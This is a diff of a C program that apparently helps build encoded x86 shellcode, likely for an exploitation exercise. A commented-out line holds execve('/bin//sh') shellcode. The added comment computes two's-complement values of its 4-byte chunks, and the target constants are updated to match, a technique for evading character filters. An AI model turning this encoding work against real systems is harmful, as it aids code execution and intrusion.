@@ -178,15 +178,30 @@ int main(){
 	//unsigned char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80\x00\x00\x00"; // length = 21
 	//unsigned char * result = create(shellcode);
 
-		
+/*
+ * >>> hex(0x100000000 - 0x80cd9958)[2:]
+ * '7f3266a8L'
+ * >>> hex(0x100000000 - 0x0b6ae389)[2:]
+ * 'f4951c77L'
+ * >>> hex(0x100000000 - 0x6e69622f)[2:]
+ * '91969dd1L'
+ * >>> hex(0x100000000 - 0x6868732f)[2:]
+ * '97978cd1L'
+ * >>> hex(0x100000000 - 0x2f6851c9)[2:]
+ * 'd097ae37L'
+ * >>> hex(0x100000000 - 0x31909090)[2:]
+ * 'ce6f6f70L'
+ * >>> hex(0x100000000 - 0x90909090)[2:]
+ * '6f6f6f70L'
+ */
 
-	// int target = 0xa7663280;
-//	int target = 0x761c95f5;
-//	int target = 0xd09d9692;
-//	 int target = 0xd08c9798;
-	 int target = 0x36ae97d1;
-//	 int target = 0x6f6f6fcf;
-	 //int target = 0x6f6f6f70;
+//	int target = 0x7f3266a8;
+//	int target = 0xf4951c77;
+//	int target = 0x91969dd1;
+//	int target = 0x97978cd1;
+//	int target = 0xd097ae37;
+//	int target = 0xce6f6f70;
+	int target = 0x6f6f6f70;
 
 	struct RESULT * result = search(target);
 	printf("[Target] : 0x%x\n", target);
